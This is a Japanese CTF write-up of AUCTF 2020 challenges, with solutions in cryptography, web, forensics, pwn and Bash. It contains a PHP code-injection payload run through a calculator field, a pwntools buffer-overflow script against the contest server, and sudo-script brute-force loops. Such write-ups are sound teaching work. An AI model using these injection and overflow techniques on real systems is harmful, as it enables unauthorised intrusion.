---
title: "AUCTF 2020 Writeup"
date: 2020-04-06T13:00:00+09:00
lastmod: 2020-04-11T17:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF", "Reviewed"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fauctf_2020%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

(2020/04/11 - 復習しました)

URL: [https://ctf.auburn.edu/challenges](https://ctf.auburn.edu/challenges)
<br /><br />
チャレンジ数が多かった！！ 時間が足りない。

<br>
Bashの問題 ([Over The Wire](https://overthewire.org/wargames/) みたいなやつ)とか、いろいろ面白いチャレンジもありました。

Password Cracking はもう少し解きたかったなぁ。。
<br /><br />

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score1.png" alt="auctf_2020_Score1.png">

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score2.png" alt="auctf_2020_Score2.png">

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Score3.png" alt="auctf_2020_Score3.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall1.png" alt="auctf_2020_Chall1.png">

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall2.png" alt="auctf_2020_Chall2.png">

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall3.png" alt="auctf_2020_Chall3.png">

<img src="https://captureamerica.github.io/writeups/img/auctf_2020_Chall4.png" alt="auctf_2020_Chall4.png">



<br /><br />
## [Cryptography]: Pretty Ridiculous
- - -
### Challenge
> Eve discovered that a piece of paper had been shoved into her pocket.. what could it be? The message she found can be downloaded at the following link:
<br /><br />
(n,e) = (627585038806247, 65537)

Attachment:

- message.txt

<table><tr><td bgcolor="#f8f5ec">
[145213650433152, 4562349440334, 24272724667960, 598242834066721, 89584939111364, 426756492371444, 511701778613016, 551732685650248, 296367799892003, 63113462897284, 198510931603899, 321201931522255, 401044612595398, 542697603423052, 213898535689643, 275839755798105, 185841409622217, 551732685650248, 121188708737752, 401044612595398, 512808963720303, 275839755798105, 198510931603899, 275839755798105, 401044612595398, 174484844253615, 551732685650248, 174486913717420, 575163265381617, 213898535689643, 401044612595398, 49103824223436, 551732685650248, 401044612595398, 598242834066721, 202722428784490, 306606077829794, 53801100921263, 401044612595398, 184805755675232, 405971446461049, 296367799892003, 275839755798105, 275839755798105, 401044612595398, 358054299396778, 4562349440334, 320837325468842, 401044612595398, 202722428784490, 551732685650248, 321201931522255, 228350651363859]
</td></tr></table>


<br />

### Solution
1個ずつRsaCtfTool.pyで解きます。trコマンドを使ってmessage.txtの "," を "\n" に変換してcipher.txtとして保存しておきました。

<pre>
$ for c in $(cat cipher.txt); do ~/Python3/RsaCtfTool/RsaCtfTool.py -n 627585038806247 -e 65537 --uncipher $c ; done

[+] Clear text : b'\x00\x00\x00\x00\x00\x00a'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00u'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00c'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00t'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00f'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00{'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00R'
[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
[+] Clear text : b'\x00\x00\x00\x00\x00\x004'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00l'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00L'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00y'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00P'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00r'
[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00M'
[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00s'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00w'
[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00L'
[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[!] Warning: Wiener attack module missing (wiener_attack.py) or SymPy not installed?
[+] Clear text : b'\x00\x00\x00\x00\x00\x00n'
[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00v'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00E'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00r'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00b'
[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00t'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00h'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00I'
[+] Clear text : b'\x00\x00\x00\x00\x00\x005'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00S'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00m'
[+] Clear text : b'\x00\x00\x00\x00\x00\x004'
[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
[+] Clear text : b'\x00\x00\x00\x00\x00\x001'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00B'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00u'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00T'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00_'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00h'
[+] Clear text : b'\x00\x00\x00\x00\x00\x003'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00y'
[+] Clear text : b'\x00\x00\x00\x00\x00\x00}'
</pre>

<br />
結果を rsa_result.txt として保存（エラーの行は削除）して、後ろから2文字目だけを取り出します。

<pre>
$ cat rsa_result.txt | rev | cut -c 2 | tr -d "\n" ; echo
auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}
</pre>

<br />
Flag: `auctf{R34lLy_Pr1M3s_w1L1_n3vEr_b3_thI5_Sm411_BuT_h3y}`


<br /><br />
<br /><br />

## [Web]: Miyazaki Trivia
- - -
### Challenge
> http://challenges.auctf.com:30020
<br /><br />
Here's a bit of trivia for you vidya game nerds.


<br />

### Solution

robots.txtにアクセスすると、以下が書かれています。

<table><tr><td bgcolor="#f8f5ec">
VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named 'answer' to submit your answer.
fear the old blood. but master willem
</td></tr></table>

<br />
adage についていろいろ調べて試したところ、`Fear the Old Blood`が正解みたいです。

<pre>
$ curl -H "answer:Fear the Old Blood" http://challenges.auctf.com:30020/robots.txt
Master Willem was right.auctf{f3ar_z_olD3_8l0oD}
</pre>

<br />
Flag: `auctf{f3ar_z_olD3_8l0oD}`



<br /><br />
<br /><br />

## [Web]: Quick Maths
- - -
### Challenge
> http://challenges.auctf.com:30021
<br /><br />
two plus two is four minus three that's one quick maths


<br />

### Solution

Webにアクセスすると、テキストボックスがあって、そこで計算をしてくれるようです。

`2+2;phpinfo()` を試したところ、phpinfoが取れました。

そこで、`2+2;system('ls -l')` を試したところ、以下が取れました。

<pre>
4total 264
-rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 date
-rwxr-xr-x 1 root root 560 Mar 31 19:34 index.php
-rwxr-xr-x 1 www-data www-data 130736 Apr 4 09:09 ls
-rw-r--r-- 1 www-data www-data 6 Apr 4 09:02 test.txt
</pre>

<br />
どうやら、date, lsはELFファイルで、おそらく他の人のテストによって生成されちゃったファイル。

test.txtも関係ないファイルでした。

index.phpの中にフラグがあると予想して、`2+2;system("grep ctf index.php")` でフラグを取りました。

<br />
Flag: `auctf{p6p_1nj3c7i0n_iz_k3wl}`


<br /><br />
<br /><br />

## [Web]: gg no re
- - -
### Challenge
> http://challenges.auctf.com:30022
<br /><br />
A junior dev built this site but we want you to test it before we send it to production.


<br />

### Solution

ページのソースを見ると、以下のjsファイルが見つかります。

http://challenges.auctf.com:30022/authentication.js

<br /><br />
authentication.jsの中にbase64でエンコードされた箇所があるので、とりあえずデコードしてみます。

<pre>
$ echo "TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw" | base64 -d
Make a GET request to /hidden/nextstep.php
</pre>


<br /><br />
言われた通り /hidden/nextstep.php にブラウザでアクセスしてみるも、特に何も見つからなかったので `curl -v` でアクセスしました。

<pre>
$ curl http://challenges.auctf.com:30022/hidden/nextstep.php -v
*   Trying 157.245.252.113:30022...
* TCP_NODELAY set
*   Trying 2604:a880:400:d0::18f4:3001:30022...
* TCP_NODELAY set
* Immediate connect fail for 2604:a880:400:d0::18f4:3001: Network is unreachable
* Connected to challenges.auctf.com (157.245.252.113) port 30022 (#0)
> GET /hidden/nextstep.php HTTP/1.1
> Host: challenges.auctf.com:30022
> User-Agent: curl/7.67.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sun, 05 Apr 2020 01:43:29 GMT
< Server: Apache/2.4.25 (Debian)
< X-Powered-By: PHP/7.0.33
< BAS64: TWFrZSBhIFBPU1QgcmVxdWVzdCB0byAvYXBpL2ZpbmFsLnBocA==    <--- なんか返ってきた。
< Content-Length: 15
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host challenges.auctf.com left intact
Howdy neighbor!
</pre>

<br /><br />
受け取ったBase64文字列をデコードします。

<pre>
$ echo TWFrZSBhIFBPU1QgcmVxdWVzdCB0byAvYXBpL2ZpbmFsLnBocA== | base64 -d
Make a POST request to /api/final.php
</pre>


<br /><br />
フラグゲットです。

<pre>
$ curl -X POST -d flag http://challenges.auctf.com:30022/api/final.php
auctf{1_w@s_laZ_w1t_dis_0N3} 

$ curl -d flag http://challenges.auctf.com:30022/api/final.php
auctf{1_w@s_laZ_w1t_dis_0N3}
</pre>

<br />
Flag: `auctf{1_w@s_laZ_w1t_dis_0N3}`


<br />
＃ところで、チャレンジ名の `gg no re` はどういう意味なんでしょうね。そっちの方がナゾです。





<br /><br />
<br /><br />

## [Forensics]: Block2
- - -
### Challenge
> Billy runs a minecraft server. He wants to know which block was rolled back. Can you help him?
<br /><br />
NONSTANDARD FLAG FORMAT: Insert the unix timestamp of the row into auctf{time_stamp}

Attachment:

- co_block.sql.gz

ファイルの中身の抜粋。
<pre>
INSERT INTO `co_block` (`rowid`, `time`, `user`, `rolled_back`, `wid`, `x`, `y`, `z`, `type`, `data`, `meta`, `blockdata`, `action`) VALUES
(612512,	1581375173,	3,	0,	1,	612,	5,	1757,	2,	0,	NULL,	'43',	1),
(612513,	1581375173,	3,	0,	1,	610,	5,	1759,	2,	0,	NULL,	'43',	1),
</pre>


<br />

### Solution

INSERT INTO の行から、各Columnの意味がわかります。`time`と`rolled_back`だけに注目したらよさそうです。

<pre>
$ grep '^(' co_block.sql | cut -d, -f2,4 | grep 1$
	1581060905,	1
</pre>

<br />
Flag: `auctf{1581060905}`




<br /><br />
<br /><br />

## [Forensics]: Animal Crossing
- - -
### Challenge
> While looking for the Animal Crossing Nintendo Switch you find weird traffic on your network. Investigate.

Attachment:

- animalcrossing.pcapng


<br />

### Solution

pcapにいろいろ含まれていますが、`weird traffic` と言えばDNSが明らかに怪しいです。

<pre>
$ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v response | grep -v "org."
   36   2.250193   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A RGlkIHlvdSBldmVyIGhlYXIgdGhlIHRyYWdlZHkgb2YgRGFydGggUGxhZ.ad.quickbrownfoxes.org
   50   2.267361   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 3VlaXMgVGhlIFdpc2U/IEkgdGhvdWdodCBub3QuIEl04oCZcyBub3QgYS.ad.quickbrownfoxes.org
   64   2.285230   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A BzdG9yeSB0aGUgSmVkaSB3b3VsZCB0ZWxsIHlvdS4gSXTigJlzIGEgU2l.ad.quickbrownfoxes.org
   78   2.301872   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 0aCBsZWdlbmQuIERhcnRoIFBsYWd1ZWlzIHdhcyBhIERhcmsgTG9yZCBv.ad.quickbrownfoxes.org
   92   2.318390   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A ZiB0aGUgU2l0aCwgc28gcG93ZXJmdWwgYW5kIHNvIHdpc2UgaGUgY291b.ad.quickbrownfoxes.org
  106   2.335391   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A GQgdXNlIHRoZSBGb3JjZSB0byBpbmZsdWVuY2UgdGhlIG1pZGljaGxvcm.ad.quickbrownfoxes.org
  120   2.354043   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A lhbnMgdG8gY3JlYXRlIGxpZmXigKYgYXVjdGZ7aXRfd2FzX3N0YXJfd2F.ad.quickbrownfoxes.org
  134   2.370916   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A yc19hbGxfYWxvbmd9IEhlIGhhZCBzdWNoIGEga25vd2xlZGdlIG9mIHRo.ad.quickbrownfoxes.org
  148   2.389254   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A ZSBkYXJrIHNpZGUgdGhhdCBoZSBjb3VsZCBldmVuIGtlZXAgdGhlIG9uZ.ad.quickbrownfoxes.org
  162   2.407589   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A XMgaGUgY2FyZWQgYWJvdXQgZnJvbSBkeWluZy4gVGhlIGRhcmsgc2lkZS.ad.quickbrownfoxes.org
  176   2.425737   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A BvZiB0aGUgRm9yY2UgaXMgYSBwYXRod2F5IHRvIG1hbnkgYWJpbGl0aWV.ad.quickbrownfoxes.org
  190   2.443757   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A zIHNvbWUgY29uc2lkZXIgdG8gYmUgdW5uYXR1cmFsLiBIZSBiZWNhbWUg.ad.quickbrownfoxes.org
  204   2.462298   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A c28gcG93ZXJmdWzigKYgdGhlIG9ubHkgdGhpbmcgaGUgd2FzIGFmcmFpZ.ad.quickbrownfoxes.org
  218   2.479877   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A CBvZiB3YXMgbG9zaW5nIGhpcyBwb3dlciwgd2hpY2ggZXZlbnR1YWxseS.ad.quickbrownfoxes.org
  232   2.498347   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A wgb2YgY291cnNlLCBoZSBkaWQuIFVuZm9ydHVuYXRlbHksIGhlIHRhdWd.ad.quickbrownfoxes.org
  246   2.516018   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A odCBoaXMgYXBwcmVudGljZSBldmVyeXRoaW5nIGhlIGtuZXcsIHRoZW4g.ad.quickbrownfoxes.org
  260   2.534242   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A aGlzIGFwcHJlbnRpY2Uga2lsbGVkIGhpbSBpbiBoaXMgc2xlZXAuIElyb.ad.quickbrownfoxes.org
  274   2.552026   10.1.1.103 → 10.1.1.10    DNS 140 Standard query 0x0006 A 25pYy4gSGUgY291bGQgc2F2ZSBvdGhlcnMgZnJvbSBkZWF0aCwgYnV0IG.ad.quickbrownfoxes.org
  684  11.324828   10.1.1.103 → 10.1.1.10    DNS 74 Standard query 0xe9db A www.odrive.com
</pre>

（最後のwww.odrive.comは無視します。）


<br />
名前のところだけ取り出します。
<pre>
$ tshark -r animalcrossing.pcapng dns | grep "A " | grep -v AAAA | grep -v response | grep -v "org." | awk '{print $12}' | cut -d. -f1 | tr -d "\n"
</pre>

<br />

base64でデコードするとフラグが見つかります。

<table><tr><td bgcolor="#f8f5ec">
Did you ever hear the tragedy of Darth Plagueis The Wise? I thought not. It’s not a story the Jedi would tell you. It’s a Sith legend. Darth Plagueis was a Dark Lord of the Sith, so powerful and so wise he could use the Force to influence the midichlorians to create life… <font color="red">auctf{it_was_star_wars_all_along}</font> He had such a knowledge of the dark side that he could even keep the ones he cared about from dying. The dark side of the Force is a pathway to many abilities some consider to be unnatural. He became so powerful… the only thing he was afraid of was losing his power, which eventually, of course, he did. Unfortunately, he taught his apprentice everything he knew, then his apprentice killed him in his sleep. Ironic. He could save others from death, but base64: invalid input
</td></tr></table>

<br />
Flag: `auctf{it_was_star_wars_all_along}`




<br /><br />
<br /><br />

## [Pwn]: Thanksgiving Dinner
- - -
### Challenge
> I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
<br /><br />
nc challenges.auctf.com 30011
<br /><br />
Note: ASLR is disabled for this challenge

Attachment:

- turkey (ELF 32bit)


<br />

### Solution

Ghidraでソースを確認します。

{{< highlight c "linenos=table,hl_lines=30" >}}
undefined4 main(void)
{
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Hi!\nWelcome to my program... it\'s a little buggy...");
  vulnerable(puVar1);
  return 0;
}

void vulnerable(void)
{
  char local_30 [16];
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  
  puts("Hey I heard you are searching for flags! Well I\'ve got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that\'s all I got!\n");
  local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
  fgets(local_30,0x24,stdin);
  if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }
  return;
}
{{< / highlight >}}

<br>
fgets()の箇所でlocal_30に入力ができますが、バッファのサイズ16バイトにも関わらず、36バイト（0x24）読み込むようになっています。

ここで、その他のローカル変数を任意の値に書き換えられます。

if文の条件に合うように値をセットしたら、print_flag()でフラグが表示されます。

<br>
`(local_14 < -0x14)` の判定が少しわかりにくいですが、ここはアセンブラで見た方がわかりやすいかもです。

{{< highlight c "linenos=table,hl_lines=5" >}}
   0x565562df <+143>:	call   0x56556040 <fgets@plt>
   0x565562e4 <+148>:	add    esp,0x10
   0x565562e7 <+151>:	cmp    DWORD PTR [ebp-0xc],0x1337
   0x565562ee <+158>:	jne    0x56556310 <vulnerable+192>
=> 0x565562f0 <+160>:	cmp    DWORD PTR [ebp-0x10],0xffffffec
   0x565562f4 <+164>:	jge    0x56556310 <vulnerable+192>
   0x565562f6 <+166>:	cmp    DWORD PTR [ebp-0x18],0x14
   0x565562fa <+170>:	je     0x56556310 <vulnerable+192>
   0x565562fc <+172>:	cmp    DWORD PTR [ebp-0x14],0x667463
   0x56556303 <+179>:	jne    0x56556310 <vulnerable+192>
   0x56556305 <+181>:	cmp    DWORD PTR [ebp-0x1c],0x2a
   0x56556309 <+185>:	jne    0x56556310 <vulnerable+192>
   0x5655630b <+187>:	call   0x56556360 <print_flag>
   0x56556310 <+192>:	nop
   0x56556311 <+193>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556314 <+196>:	leave  
   0x56556315 <+197>:	ret   
{{< / highlight >}}

<br>
`0xffffffec` との比較をしているので、`0xffffffeb` か `0xffffffed` のどちらかで行けるでしょう（笑）

（`0xffffffeb` が正解でした。)


<br>
ということで、書いたコードです。

```Python
#!/usr/bin/env python
from pwn import *

if 0:
    s = process('./turkey')
else:
    s = remote('challenges.auctf.com', 30011)

payload = ''
payload += b'A' * 16
payload += p32(0x0000002a)
payload += p32(0x00000015)
payload += p32(0x00667463)
payload += p32(0xffffffeb)
payload += p32(0x00001337)

# s.sendlineafter("all I got!\n\n", payload)
print s.recvuntil("all I got!\n\n")
s.sendline(payload)

msg = s.recvall()
print(msg)
```

<br>

Flag: `auctf{I_s@id_1_w@s_fu11!}`

      

<br /><br />
<br /><br />

## [Bash]: Bash 2
- - -
### Challenge
>ssh challenges.auctf.com -p 30040 -l level2
<br /><br />
password is the flag of the previous Bash challenge

<br />

### Solution

```
$ ls -la
total 28
dr-xr-x--x 1 level2 level2 4096 Apr  3 16:00 .
drwxr-xr-x 1 root   root   4096 Apr  3 15:35 ..
-rw-r--r-- 1 level2 level2  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level2 level2 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level2 level2  807 Apr  4  2018 .profile
-r--r----- 1 level3 level3   22 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level3 level2  110 Apr  1 21:25 random_dirs.sh


$ cat random_dirs.sh
#!/bin/bash

x=$RANDOM

base64 flag.txt > /tmp/$x
function finish {
       rm  /tmp/$x
}
trap finish EXIT

sleep 15


$ sudo -l
Matching Defaults entries for level2 on a522debb8813:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User level2 may run the following commands on a522debb8813:
    (level3) NOPASSWD: /home/level2/random_dirs.sh
```

<br />
みんなが同じマシンで作業してたので、ゴミファイルとかも結構あったし、結果として/tmpの下をモニターしているだけでフラグが取れちゃいました。

<pre>
$ cd /tmp
$ find . -type f | xargs cat | grep -v try
YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==
:
:
</pre>

（`grep -v try` は、他の人が作ったゴミをフィルターするだけのものです。）

<br />
<pre>
$ echo "YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==" | base64 -d
auctf{g0tt@_muv_fas7}
</pre>

<br />

Flag: `auctf{g0tt@_muv_fas7}`

＃なにかを速く移動 (move fast) させないといけなかったのかな？



<br /><br />
<br /><br />

## [Bash]: Bash 3
- - -
### Challenge
>ssh challenges.auctf.com -p 30040 -l level3
<br /><br />
password is the flag of the previous Bash challenge

<br />

### Solution

```
$ ls -la
total 28
dr-xr-x--x 1 level3 level3 4096 Apr  3 16:00 .
drwxr-xr-x 1 root   root   4096 Apr  3 15:35 ..
-rw-r--r-- 1 level3 level3  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level3 level3 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level3 level3  807 Apr  4  2018 .profile
-r--r----- 1 level4 level4   30 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level4 level3  179 Apr  1 21:25 passcodes.sh


$ cat passcodes.sh
#!/bin/bash

x=$RANDOM
echo "Input the random number."
read input

if [[ "$input" -eq "$x" ]]
then
	echo "AWESOME sauce"
	cat flag.txt
else
	echo "$input"
	echo "$x try again"
fi


$ sudo -l
Matching Defaults entries for level3 on a95be49047ca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User level3 may run the following commands on a95be49047ca:
    (level4) NOPASSWD: /home/level3/passcodes.sh

```

<br />
（ちなみに、初日は `sudo -u level4 /home/level3/passcodes.sh` の実行にパスワードが要求されて、2日目には直っていました。）

<br />
どれか1つ決め打ちで無限ループしたら、そのうち当たるだろう、というやり方です。
<pre>
$ while true ; do echo 1 | sudo -u level4 /home/level3/passcodes.sh; done | grep -i auctf
auctf{wut_r_d33z_RaNdom_numz}
</pre>

<br />

Flag: `auctf{wut_r_d33z_RaNdom_numz}`



<br /><br />
<br /><br />

## [Bash]: Bash 4
- - -
### Challenge
>ssh challenges.auctf.com -p 30040 -l level4

<br />

### Solution

```
$ ls -la
total 32
dr-xr-xr-x 1 root   root   4096 Apr  4 21:54 .
drwxr-xr-x 1 root   root   4096 Apr  3 15:35 ..
-rw-r--r-- 1 level4 level4  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level4 level4 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level4 level4  807 Apr  4  2018 .profile
-r--r----- 1 level5 level5   25 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level5 level4  209 Apr  1 21:25 print_file.sh


$ cat print_file.sh
#!/bin/bash

if [ ! -z "$@" ]
then
	cat $@ # 2>/dev/null
	# if [ ! $? -eq 0 ]
	# then
	# 	echo "Printing error. Check file permissions"
	# fi
else
	echo "Please enter a file."
	echo "./print_file FILENAME"
fi


$ sudo -l
Matching Defaults entries for level4 on 7fe0b0d86907:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User level4 may run the following commands on 7fe0b0d86907:
    (level5) NOPASSWD: /home/level4/print_file.sh
```

<br />

<pre>
$ sudo -u level5 /home/level4/print_file.sh flag.txt
auctf{FunKy_P3rm1ssi0nZ}
</pre>

<br />

Flag: `auctf{FunKy_P3rm1ssi0nZ}`

＃ここにきて、何がFunkyなのか意味がわからなかったです。



<br /><br />
<br /><br />

## [Bash]: Bash 5
- - -
### Challenge
>ssh challenges.auctf.com -p 30040 -l level5

<br />

### Solution

```
$ ls -la
total 36
dr-xr-xr-x 1 root   root   4096 Apr  4 21:54 .
drwxr-xr-x 1 root   root   4096 Apr  3 15:35 ..
-rw-r--r-- 1 level5 level5  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level5 level5 3777 Apr  4 22:03 .bashrc
-rw-r--r-- 1 level5 level5  807 Apr  4  2018 .profile
-r--r----- 1 root   root     23 Apr  1 21:25 flag.txt
-r-xr-x--- 1 root   level5  137 Apr  1 21:25 portforce.sh


$ cat portforce.sh
#!/bin/bash

x=$(shuf -i 1024-65500 -n 1)
echo "Guess the listening port"
input=$(nc -lp $x)
echo "That was easy right? :)"
cat flag.txt


$ sudo -l
Matching Defaults entries for level5 on 7fe0b0d86907:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User level5 may run the following commands on 7fe0b0d86907:
    (ALL) NOPASSWD: /home/level5/portforce.sh
```

<br />
これはローカルで試したら、よくわかりやすかったです。

以下のようなファイルを用意。

```sh
#!/bin/bash

x=$(shuf -i 1024-65500 -n 1)
echo "Guess the listening port"
echo $x   # <<<< これを追加
input=$(nc -lp $x)
echo "That was easy right? :)"
cat flag.txt
```

<br />
これで実行すると、どのポートでncがlistenしているかわかるので、（ま、netstatでもよかったけど）

そのポートに対して、`echo test | nc localhost <port>` みたいにしてやると、以降の処理が実行されてフラグが表示されました。

ちなみに、ローカルでテストする場合は、rootじゃなくても、自分自身でテストはできました。


<br />
ということで、チャレンジサーバ上で、`sudo /home/level5/portforce.sh`を実行して待受けしつつ、別のターミナルにて、

<pre>
$ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
invalid port {1024..65500} : No such file or directory

$ /bin/bash
$ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
</pre>

{{% admonition tip "Tips" %}}
/bin/sh と /bin/bash でループの書き方が違うので、上記のやり方は/bin/shだとエラーになります。
{{% /admonition %}}


<br />
Flag: `auctf{n3tc@_purt_$can}`

＃Discordで、「Random portがたまたま2回目で当たった」	と喜んでいる人がいました。たぶん、それはポート番号が当たったんじゃなくて、他の人がncを実行してくれたんだと思います。それはそれでラッキーでしたね^^




<br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はイベント終了後に行った復習です。

<br /><br />
<br /><br />
## [OSINT]: Good Old Days
- - -
### Challenge
>This site used to look a lot cooler.

<br />

### Solution
チャレンジ内容から考えて、Web Archiveから過去のページを調べるやつでしたね。

https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users

<br />

Flag: `auctf{Th053_w3rE_Th3_guD_0l3_d4y5}`



<br /><br />
<br /><br />
## [Sequence]: Can You SeeDa Sequence
- - -
### Challenge
>Time to put your problem solving skills to work! Finish the sequence!
<br /><br />
If you asc me, this looks pretty random.
<br /><br />
98, 107, 10, 66, 124, _, _, _, _, _
<br /><br />
NOTE: The flag is NOT in the standard auctf{} format
<br /><br />
flag format - comma separated list 1, 2, 3, 4, 5

<br />

### Solution
'SeeDa' なので Seedを0か何かに決め打ちしてrand()関数を呼んだらシーケンスが見れると思ってCでやろうとしてたんですが、ダメでした（読みは合ってた）。これは、Pythonでやるやつだったみたいです。

ちなみに、ダメだったやつ：
```C
#include <stdio.h>
#include <stdlib.h>

#define RAND_MAX 128

int main()
{
	srand(0);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
	printf("%d ", rand() % 128);
}
```

ダメな結果：
<pre>
103 70 105 115 81 127 74 108 
</pre>

<br />
正解：

```Python
$ python3
>>> import random
>>> random.seed(0)
>>> random.randint()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: randint() missing 2 required positional arguments: 'a' and 'b'
>>> random.randint(0,128)
98
>>> random.randint(0,128)
107
>>> random.randint(0,128)
10
>>> random.randint(0,128)
66
>>> random.randint(0,128)
124
>>> random.randint(0,128)
103
>>> random.randint(0,128)
77
>>> random.randint(0,128)
122
